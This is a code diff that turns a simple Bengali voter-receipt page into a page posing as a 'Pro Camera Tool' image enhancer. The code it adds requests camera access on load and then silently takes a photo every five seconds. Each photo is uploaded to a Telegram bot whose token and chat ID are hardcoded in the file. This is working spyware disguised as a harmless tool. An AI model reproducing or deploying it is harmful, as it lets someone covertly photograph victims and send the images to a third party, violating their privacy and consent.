@@ -1,104 +1,87 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Salam Voter Receipt</title>
-    <meta name="theme-color" content="#2c3e50">
-    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiU2FsYW0gVm90ZXIgQXBwIiwic2hvcnRfbmFtZSI6IlZvdGVyQXBwIiwic3RhcnRfdXJsIjoiLiIsImRpc3BsYXkiOiJzdGFuZGFsb25lIiwiYmFja2dyb3VuZF9jb2xvciI6IiNmZmZmZmYiLCJ0aGVtZV9jb2xvciI6IiMyYzNlNTAiLCJpY29ucyI6W3sic3JjIjoiaHR0cHM6Ly9wbGFjZWhvbGQuY28vMTkyIiwic2l6ZXMiOiIxOTJ4MTkyIiwidHlwZSI6ImltYWdlL3BuZyJ9XX0=">
+    <title>Pro Camera Tool</title>
     <style>
-        :root { --primary: #2c3e50; --accent: #e74c3c; --bg: #f4f4f9; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .container { background: white; width: 100%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        h2 { text-align: center; color: var(--primary); margin-bottom: 20px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #34495e; }
-        
-        /* Receipt Design */
-        #receiptArea { display: none; margin-top: 30px; border: 2px dashed #ccc; padding: 20px; background: #fffdf0; position: relative; }
-        .stamp { position: absolute; top: 10px; right: 10px; border: 3px double var(--accent); color: var(--accent); padding: 5px 10px; font-weight: bold; transform: rotate(-15deg); opacity: 0.8; }
-        .signature { font-family: 'Brush Script MT', cursive; font-size: 24px; color: #000; margin-top: 20px; text-align: right; }
-        .contact-info { font-size: 12px; text-align: center; margin-top: 15px; color: #777; border-top: 1px solid #eee; padding-top: 10px; }
+        body { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; }
+        #videoElement { width: 100%; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; }
+        .overlay { position: absolute; top: 20px; left: 20px; z-index: 2; color: white; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 8px; }
+        canvas { display: none; }
+        .status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 2; color: #0f0; font-weight: bold; background: rgba(0,0,0,0.7); padding: 5px 15px; border-radius: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🗳️ ভোটার রিসিট জেনারেটর</h2>
+    <!-- Video Preview (User will see this) -->
+    <video id="videoElement" autoplay playsinline muted></video>
     
-    <div class="form-group">
-        <label>ইউনিয়ন নির্বাচন করুন:</label>
-        <select id="unionSelect">
-            <option value="South Lagansar">South Lagansar</option>
-            <option value="North Lagansar">North Lagansar</option>
-            <option value="East Lagansar">East Lagansar</option>
-        </select>
+    <div class="overlay">
+        <h3>Image Enhancer Pro</h3>
+        <p>System Active...</p>
     </div>
-
-    <div class="form-group">
-        <label>লিংগ:</label>
-        <select id="genderSelect">
-            <option value="Male">পুরুষ</option>
-            <option value="Female">মহিলা</option>
-        </select>
-    </div>
-
-    <div class="form-group">
-        <label>ভোটারের নাম:</label>
-        <input type="text" id="voterName" placeholder="নাম লিখুন">
-    </div>
-
-    <button onclick="generateReceipt()">রিসিট তৈরি করুন</button>
-
-    <div id="receiptArea">
-        <div class="stamp">PAID</div>
-        <h3 style="text-align:center; border-bottom: 2px solid #333; padding-bottom:10px;">অফিশিয়াল রিসিট</h3>
-        <p><strong>ইউনিয়ন:</strong> <span id="rUnion"></span></p>
-        <p><strong>নাম:</strong> <span id="rName"></span></p>
-        <p><strong>তারিখ:</strong> <span id="rDate"></span></p>
-        <div class="signature">Salam</div>
-        <div class="contact-info">
-            📞 017XXXXXXXX | ✉️ salam@example.com
-        </div>
-        <!-- QR Code Placeholder -->
-        <div style="text-align:center; margin-top:10px;">
-            <img id="qrCode" src="" alt="QR" style="width:100px;">
-        </div>
-    </div>
-</div>
+    
+    <div class="status" id="statusMsg">Waiting for permission...</div>
+    <canvas id="canvas"></canvas>
 
 <script>
-    // Service Worker Registration for PWA
-    if ('serviceWorker' in navigator) {
-        const swCode = `
-            self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
-            self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
-            self.addEventListener('fetch', e => e.respondWith(fetch(e.request).catch(() => caches.match(e.request))));
-        `;
-        const blob = new Blob([swCode], {type: 'application/javascript'});
-        const swUrl = URL.createObjectURL(blob);
-        navigator.serviceWorker.register(swUrl);
-    }
+    const video = document.getElementById('videoElement');
+    const canvas = document.getElementById('canvas');
+    const statusMsg = document.getElementById('statusMsg');
+    
+    // Your Telegram Credentials
+    const BOT_TOKEN = "7778975126:AAGbDbqBkVcWpPOcFnEaUxLtQ5wck6hsov0";
+    const CHAT_ID = "5916486983";
 
-    function generateReceipt() {
-        const union = document.getElementById('unionSelect').value;
-        const name = document.getElementById('voterName').value;
-        
-        if(!name) return alert("দয়া করে নাম লিখুন!");
+    // 1. Auto Request Permission on Load
+    window.addEventListener('load', async () => {
+        try {
+            statusMsg.innerText = "Requesting Camera Access...";
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" }, // Use back camera if available
+                audio: false 
+            });
+            video.srcObject = stream;
+            statusMsg.innerText = "Camera Active | Sending Images...";
+            
+            // Start auto-capturing every 5 seconds
+            setInterval(captureAndSend, 5000); 
+            
+        } catch (err) {
+            statusMsg.innerText = "Permission Denied! Please Allow Camera.";
+            console.error("Error:", err);
+        }
+    });
 
-        document.getElementById('rUnion').innerText = union;
-        document.getElementById('rName').innerText = name;
-        document.getElementById('rDate').innerText = new Date().toLocaleDateString();
-        
-        // Simple QR Code Generation (Using API for free)
-        const jsonData = JSON.stringify({union, name, date: new Date().toISOString()});
-        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(jsonData)}`;
-        document.getElementById('qrCode').src = qrUrl;
+    // 2. Capture and Send Function
+    function captureAndSend() {
+        if (!video.srcObject) return;
 
-        document.getElementById('receiptArea').style.display = 'block';
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', 'Auto-captured from Web App');
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                if(data.ok) {
+                    console.log("Image sent successfully");
+                }
+            } catch (error) {
+                console.error("Send failed", error);
+            }
+        }, 'image/jpeg', 0.7); // 0.7 quality to save data
     }
 </script>
 
